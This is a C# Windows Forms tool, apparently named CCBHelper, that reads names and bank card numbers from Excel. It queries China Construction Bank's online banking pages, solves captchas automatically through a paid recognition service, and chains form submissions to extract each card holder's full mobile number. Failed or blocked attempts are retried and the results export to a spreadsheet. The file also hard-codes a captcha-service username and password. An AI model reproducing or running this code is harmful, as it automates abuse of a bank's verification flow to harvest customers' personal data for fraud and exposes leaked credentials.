using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.OleDb;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using FastVerCode;
using System.Threading;
using System.Web;
namespace CCBHelper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        private List<FirstUserInfo> FirstUserInfoList = new List<FirstUserInfo>();//起始导入的数据
        private List<FirstUserInfo> LastUserInfoList = new List<FirstUserInfo>();//爬完毕的数据
        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                //打开Excel文件
                #region
                OpenFileDialog opf = new OpenFileDialog();
                opf.Title = "Excel文件";
                opf.Filter = "Excel文件| *.xlsx;*.xls";
                opf.InitialDirectory = "c:\\";
                string tableName = "";
                string path = "";
                if (opf.ShowDialog() == DialogResult.OK)
                {
                    path = opf.FileName;
                }
                tableName = GetExcelTableName(path);
                string Tsql = "Select * From [" + tableName + "]";
                DataTable firstTable = ExcelToDataset(path, Tsql).Tables[0];
                for (int i = 0; i < firstTable.Rows.Count; i++)
                {
                    FirstUserInfoList.Add(new FirstUserInfo()
                    {
                        Name = firstTable.Rows[i][0].ToString(),
                        BankId = firstTable.Rows[i][1].ToString()
                    });

                    ListViewItem li = new ListViewItem(firstTable.Rows[i][0].ToString());
                    li.SubItems.Add(firstTable.Rows[i][1].ToString());
                    this.listView1.Items.Add(li);
                }
                this.label1.Text = "状态：成功导入数据【" + firstTable.Rows.Count + "】个";
                #endregion
            }
            catch (Exception ee)
            {
                MessageBox.Show(ee.Message);
            }
        }

        private DataSet ExcelToDataset(string fileName, string Tsql)
        {
            //Excel变成Dataset
            try
            {
                DataSet ds;
                string strCon = "Provider=Microsoft.Jet.OLEDB.4.0;Extended Properties=Excel 8.0;data source=" + fileName;
                OleDbConnection myConn = new OleDbConnection(strCon);
                string strCom = Tsql;
                myConn.Open();
                OleDbDataAdapter myCommand = new OleDbDataAdapter(strCom, myConn);
                ds = new DataSet();
                myCommand.Fill(ds);
                myConn.Close();
                return ds;
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
                return null;
            }
        }

        private string GetExcelTableName(string fullPath)
        {
            //获取Excel表名
            string tableName = null;
            if (File.Exists(fullPath))
            {
                using (OleDbConnection conn = new OleDbConnection("Provider=Microsoft.Jet.OLEDB.4.0;Extended Properties=Excel 8.0;data source=" + fullPath))
                {
                    conn.Open();
                    tableName = conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, null).Rows[0][2].ToString().Trim();
                }
            }
            return tableName;
        }

        private string url_getformvalue = "";
        private List<string> formid = new List<string>();
        private void button3_Click(object sender, EventArgs e)
        {
            Thread t = new Thread(GetTelFunc);
            t.Start();
        }


        private void GetTelFunc()
        {

            for (int i = 0; i < FirstUserInfoList.Count; i++)
            {
                try
                {
                    string name = FirstUserInfoList[i].Name;//姓名
                    string bankid = FirstUserInfoList[i].BankId;//银行卡号
                    string yzm = "";//验证码
                    string CCBIBS = "";//验证码Cookie
                    string yzmurl = "";//验证码链接
                    string tel = "";//手机号
                    url_getformvalue = $"https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlat_13?SERVLET_NAME=B2CMainPlat_13&CCB_IBSVersion=V6&PT_STYLE=1&TXCODE=B30200&SKEY=&BRANCHID=010231000&CUSTTYPE=0&ACCNO={bankid}&CHECKNAME={name}";//获取表单值的URL
                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url_getformvalue);
                    request.Method = "get";
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        //之所以为什么之前Reader只能用一次？因为它在Using里面，用了一次以后就自动关闭了！！所以用了一次以后，就销毁，就为空了！
                        string code = reader.ReadToEnd();//得到网站源码内容
                        Match m_mac = Regex.Match(code, @"(?<=name='MAC' value=')[\d\S]*?(?='\>)");//mac的正则表达式
                        Match m_namevalue = Regex.Match(code, @"(?<=id=')[\d\S]*?(?=' name=')");//名字表单值的正则表达式
                        Match m_CCBIBS = Regex.Match(code, "(?<=/NCCB_Encoder/Encoder\\?CODE=)[\\s\\S]*?(?=\")");//验证码Cookie的正则表达式
                        CCBIBS = m_CCBIBS.ToString();
                        yzmurl = "https://ibsbjstar.ccb.com.cn/NCCB_Encoder/Encoder?CODE=" + CCBIBS;//得到验证码链接

                        //以下发现没卵用，备用。
                        //string m_formids = "(?<=hidden\" name=\")[\\d\\S]*?(?=\" id=)";
                        //MatchCollection formids = Regex.Matches(code, m_formids);
                        //foreach (Match item in formids)
                        //{
                        //    formid.Add(item.ToString());
                        //}


                        //提交信息
                        yzm = Scanyzm(yzmurl);//扫描二维码，识别出二维码。
                        string postData = $"{m_namevalue}={name}&MAC={m_mac.ToString()}&ACCNO={bankid}&VALIDATE=&CVV2=&BANK=&BBANK=&PT_CONFIRM_PWD={yzm}&BRANCHID=010231000&SKEY=&TXCODE=B30207&TURN_FROM_FALG=FB30200&flag=true&CUSTTYPE=0";
                        HttpWebRequest request2 = (HttpWebRequest)WebRequest.Create("https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlat_13?SERVLET_NAME=B2CMainPlat_13&CCB_IBSVersion=V6&PT_STYLE=1");
                        request2.Method = "post";
                        request2.CookieContainer = new CookieContainer();
                        request2.ContentLength = postData.Length;
                        request2.ContentType = "application/x-www-form-urlencoded";
                        request2.CookieContainer.Add(new Cookie("CCBIBS1", CCBIBS, "/CCBIS", "ibsbjstar.ccb.com.cn"));
                        using (Stream stream = request2.GetRequestStream())
                        {
                            stream.Write(Encoding.UTF8.GetBytes(postData), 0, postData.Length);
                        }
                        HttpWebResponse response2 = (HttpWebResponse)request2.GetResponse();
                        string tel4 = "";
                        using (StreamReader reader2 = new StreamReader(response2.GetResponseStream()))
                        {
                            Match m_tel = Regex.Match(reader2.ReadToEnd(), "(?<=var mobile = \")[\\s\\S]+?(?=\")");//手机号码正则表达式
                            tel = m_tel.ToString().Replace("****", "-");//将手机号码分割
                            tel4 = tel.Split('-')[1];//得到手机号码后四位
                        }




                        //第二次套娃
                        #region
                        string ccbibs2 = GetRequest("https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlat_13?SERVLET_NAME=B2CMainPlat_13&CCB_IBSVersion=V6&PT_STYLE=1&TXCODE=100119&USERID=&SKEY=&random=1594058551910").Replace("\r\n", "");//得到验证码的Cookie
                        string yzm2url = "https://ibsbjstar.ccb.com.cn/NCCB_Encoder/Encoder?CODE=" + ccbibs2;//验证码地址
                        string yzm2 = Scanyzm(yzm2url);//扫描出验证码

                        //提交表单
                        string name11 = HttpUtility.UrlEncode(name);//URL编码
                        string name22 = HttpUtility.UrlEncode(name11);//二次URL编码

                        string returnEnd = PostRequest("https://ibsbjstar.ccb.com.cn/CCBIS/B2CMainPlatVM?CCB_IBSVersion=V6&PT_STYLE=2", $"CHECKNAME1={name11}&CHECKNAME={name22}&ACCNO1={bankid}&ACCNO={bankid}&MOBILE4={tel4}&CVV2=&VALIDATE=&BANK=&PT_CONFIRM_PWD={yzm2}&BRANCHID=*&TXCODE=IW0303&CCB_PWD_MAP_GIGEST=", ccbibs2);
                        Match m_alltel = Regex.Match(returnEnd, "(?<=var mobile=')[\\s\\S]+?(?=')");//得出全部手机号码的正则表达式
                        string alltel = m_alltel.ToString();
                        if (alltel == "")
                        {
                            //如果获取的手机号码为空，意味着获取失败，那就从头到尾再来一次
                            i--;
                            continue;
                        }
                        this.label1.Text = "状态：" + name + "获取成功";
                        ListViewItem li = new ListViewItem(name);
                        li.SubItems.Add(bankid);
                        li.SubItems.Add(alltel);
                        this.listView2.Items.Add(li);
                        #endregion
                    }
                }
                catch (Exception)
                {
                    //如果程序出错，意味着获取识别，那就从头到尾再来一次
                    this.label1.Text = "状态：被拦截，重新请求一次";
                    i--;
                    continue;
                }

            }
            this.label1.Text = "状态：任务全部处理完毕";
        }

        /// <summary>
        /// 识别验证码
        /// </summary>
        /// <param name="yzmurl"></param>
        /// <returns></returns>
        private string Scanyzm(string yzmurl)
        {
            string path = Directory.GetCurrentDirectory();
            WebClient wc = new WebClient();
            wc.DownloadFile(yzmurl, path + "\\yzm.jpg");
            string username = "a210582158";
            string pwd = "WWWq990624";
            string softKey = "a210582158";
            //获取用户信息 
            string userInfo = VerCode.GetUserInfo(username, pwd);
            //上传本地验证码
            string returnMess = VerCode.RecYZM_A(path + "\\yzm.jpg", username, pwd, softKey);
            string yzm = returnMess.Substring(0, 5);
            return yzm;
        }

        public void UWriteListViewToExcel(ListView LView, string strTitle)
        {
            try
            {
                Microsoft.Office.Interop.Excel.Application ExcelApp = new Microsoft.Office.Interop.Excel.Application();
                object m_objOpt = System.Reflection.Missing.Value;
                Microsoft.Office.Interop.Excel.Workbooks ExcelBooks = (Microsoft.Office.Interop.Excel.Workbooks)ExcelApp.Workbooks;
                Microsoft.Office.Interop.Excel._Workbook ExcelBook = (Microsoft.Office.Interop.Excel._Workbook)(ExcelBooks.Add(m_objOpt));
                Microsoft.Office.Interop.Excel._Worksheet ExcelSheet = (Microsoft.Office.Interop.Excel._Worksheet)ExcelBook.ActiveSheet;

                //设置标题
                ExcelApp.Caption = strTitle;
                ExcelSheet.Cells[1, 1] = strTitle;

                //写入列名
                for (int i = 1; i <= LView.Columns.Count; i++)

                {
                    ExcelSheet.Cells[2, i] = LView.Columns[i - 1].Text;
                }

                //写入内容
                for (int i = 3; i < LView.Items.Count + 3; i++)
                {
                    ExcelSheet.Cells[i, 1] = LView.Items[i - 3].Text;
                    for (int j = 2; j <= LView.Columns.Count; j++)
                    {
                        ExcelSheet.Cells[i, j] = LView.Items[i - 3].SubItems[j - 1].Text;
                    }
                }

                //显示Excel
                ExcelApp.Visible = true;
            }
            catch (SystemException e)
            {
                MessageBox.Show(e.ToString());
            }
        }


        private string PostRequest(string url, string postData, string cookieValue)
        {

            HttpWebRequest _request = (HttpWebRequest)WebRequest.Create(url);
            _request.Method = "Post";
            _request.ContentLength = postData.Length;
            _request.ContentType = "application/x-www-form-urlencoded";
            _request.CookieContainer = new CookieContainer();
            _request.CookieContainer.Add(new Cookie("CCBIBS1", cookieValue, "/CCBIS", "ibsbjstar.ccb.com.cn"));
            using (Stream _stream = _request.GetRequestStream())
            {
                _stream.Write(Encoding.UTF8.GetBytes(postData), 0, postData.Length);
            }
            HttpWebResponse _response = (HttpWebResponse)_request.GetResponse();
            using (StreamReader _reader = new StreamReader(_response.GetResponseStream()))
            {
                return _reader.ReadToEnd();
            }


        }

        public static string GetRequest(string url)
        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "Get";
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            using (StreamReader reader = new StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            UWriteListViewToExcel(this.listView2, "建行卡");
        }


        private void Form1_Load_1(object sender, EventArgs e)
        {

        }
    }
}
